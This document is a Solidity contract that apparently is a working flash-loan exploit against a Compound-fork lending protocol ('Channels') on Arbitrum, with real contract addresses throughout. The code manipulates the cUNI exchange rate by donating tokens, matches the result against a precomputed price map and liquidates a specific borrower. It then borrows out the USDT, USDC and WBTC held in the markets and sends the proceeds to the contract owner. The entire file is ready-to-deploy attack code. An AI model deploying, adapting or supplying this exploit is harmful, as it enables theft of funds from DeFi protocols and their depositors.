// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IERC20.sol";

import "./IBalancer.sol";
import "./IFlashLoanRecipient.sol";
import "./IOracle.sol";
import "./ICToken.sol";
import "./IComptroller.sol";

import "./IUniswapV2Router.sol";

// Channels Arbi
contract Loan18 is IFlashLoanRecipient {
    IBalancer constant vault = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router constant router = IUniswapV2Router(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506); // sushi router

    IComptroller constant tenderComp = IComptroller(0xeed247Ba513A8D6f78BE9318399f5eD1a4808F8e);
    ICToken constant tUNI = ICToken(0x8b44D3D286C64C8aAA5d445cFAbF7a6F4e2B3A71);
    ICToken constant tUSDC = ICToken(0x068485a0f964B4c3D395059a19A05a8741c48B4E);

    IComptroller constant comptroller = IComptroller(0x3C13b172bf8BE5b873EB38553feC50F78c826284);
    IOracle constant oracle = IOracle(0x1d47F4A95Db7A3fC4141b5386AB06fde6367fd12);
    ICToken constant cUNI = ICToken(0xaB06f920da5C07c184cd39D2f9907D788654013E); // Collateral Factor 60%
    ICToken constant cUSDT = ICToken(0x92F6AA3d3d4b46f5e99a26984B4112c7Faa0C96c);
    ICToken constant cUSDC = ICToken(0xce8Fa238383bC3036aBE3410D7D630C7692Eb6D7);
    ICToken constant cWETH = ICToken(0x0Ddf298FB7fd115fddB714EB722F8be5Dc238C78);
    ICToken constant cWBTC = ICToken(0x1b1740085C04286a318ae47400a3561b890979C7);
    IERC20 constant UNI = IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    address constant borrower = 0xD1edDE2FFAC4bc901b7E7a817Af126C2Ef332a27;
    address immutable owner;

    mapping(uint => uint) public exchangeRates;

    error PriceNotDefined(uint price);

    constructor() {
        owner = msg.sender;

        // Initial experimental price map
        exchangeRates[4025770000000000000] = 89962382658156654457773968;
        exchangeRates[4164700000000000000] = 90476163304476768740447503;
        exchangeRates[4197000000000000000] = 90229704677680676145671914;
        exchangeRates[4200000000000000000] = 90215728453296831959782786;
        exchangeRates[4216020000000000000] = 90231826851457496904043488;
        exchangeRates[4223105300000000000] = 90211616587230989279378849;
        exchangeRates[4247700000000000000] = 90232936710794576403123469;
        exchangeRates[4253700000000000000] = 90116176180908675457968304;
        exchangeRates[4264700000000000000] = 90211139785866790082427937;
        exchangeRates[4273329180000000000] = 90210821876648063117521595;
        exchangeRates[5155505870000000000] = 91015627612924319360348429;
        exchangeRates[5224129700000000000] = 95267586116914260053625898;
    }

    function setPriceMap(uint price, uint exchangeRate) external {
        require(msg.sender == owner);
        exchangeRates[price] = exchangeRate;
    }

    function start(address[] memory tokens, uint256[] memory amounts) external {
        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, new bytes(0));
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory amounts, uint256[] memory, bytes memory) external {
        // Borrow UNI(ARB) from Tender Finance
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(tUSDC);
        tenderComp.enterMarkets(cTokens);

        USDC.approve(address(tUSDC), type(uint).max);
        tUSDC.mint(1e6 * 100000);
        tUNI.borrow(1e18 * 4500);

        uint seize;
        uint liqAmount;

        uint uniPrice = oracle.getUnderlyingPrice(address(cUNI));
        if (exchangeRates[uniPrice] == 0) revert PriceNotDefined(uniPrice);

        UNI.transfer(address(cUNI), 5e18);
        cUNI.accrueInterest();

        uint transferAmount;
        {
            uint exR = exchangeRates[uniPrice];
            uint tB0 = cUNI.totalBorrows();
            uint tR0 = cUNI.totalReserves();

            uint b = (exR * cUNI.totalSupply()) / 1e18;
            transferAmount = b - tB0 + tR0 - UNI.balanceOf(address(cUNI));
        }
        UNI.transfer(address(cUNI), transferAmount);

        cUNI.accrueInterest();

        USDC.approve(address(cUSDC), type(uint).max);
        liqAmount = cUSDC.borrowBalanceStored(borrower) / 2;
        (, seize) = comptroller.liquidateCalculateSeizeTokens(address(cUSDC), address(cUNI), liqAmount);
        cUSDC.liquidateBorrow(borrower, liqAmount, address(cUNI));

        liqAmount = cUSDC.borrowBalanceStored(borrower) / 2;
        (, seize) = comptroller.liquidateCalculateSeizeTokens(address(cUSDC), address(cUNI), liqAmount);
        liqAmount = (liqAmount * cUNI.balanceOf(borrower)) / seize;
        cUSDC.liquidateBorrow(borrower, liqAmount, address(cUNI));

        UNI.approve(address(cUNI), type(uint).max);
        cUNI.repayBorrowBehalf(borrower, cUNI.borrowBalanceStored(borrower));
        uint delta = cUNI.totalBorrows() - cUNI.totalReserves();
        cUNI.repayBorrowBehalf(0xFF16d64179A02D6a56a1183A28f1D6293646E2dd, delta);
        cUNI.redeem(cUNI.balanceOf(address(this)));

        cTokens[0] = address(cUNI);
        comptroller.enterMarkets(cTokens);

        // Prepare cUNI Collateral
        UNI.transfer(address(cUNI), 1);
        uint uniBal = UNI.balanceOf(address(this));
        cUNI.mint(uniBal);
        cUNI.redeem(cUNI.balanceOf(address(this)) - 2);
        UNI.transfer(address(cUNI), UNI.balanceOf(address(this)));

        // Borrow USDT, USDC, WBTC (Profit)
        USDT.transfer(address(cUSDT), 100e6);
        cUSDT.borrow(USDT.balanceOf(address(cUSDT)));
        cUSDC.borrow(USDC.balanceOf(address(cUSDC)));
        cWBTC.borrow(0.035e8);
        cUNI.redeemUnderlying(uniBal);

        // Redeem USDC from Tender
        UNI.approve(address(tUNI), type(uint).max);
        tUNI.repayBorrow(1e18 * 4500);
        tUSDC.redeemUnderlying(1e6 * 100000);

        // Swap USDT, WBTC to USDC
        address[] memory path = new address[](3);
        path[0] = address(USDT);
        path[1] = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1; // WETH
        path[2] = address(USDC);

        USDT.approve(address(router), type(uint).max);
        router.swapExactTokensForTokens(
            USDT.balanceOf(address(this)) - amounts[0],
            0,
            path,
            address(this),
            block.timestamp + 100
        );

        path[0] = address(WBTC);
        WBTC.approve(address(router), type(uint).max);
        router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100);

        // Repay Loan
        USDT.transfer(address(vault), amounts[0]);
        USDC.transfer(address(vault), amounts[1]);

        // Withdraw
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}

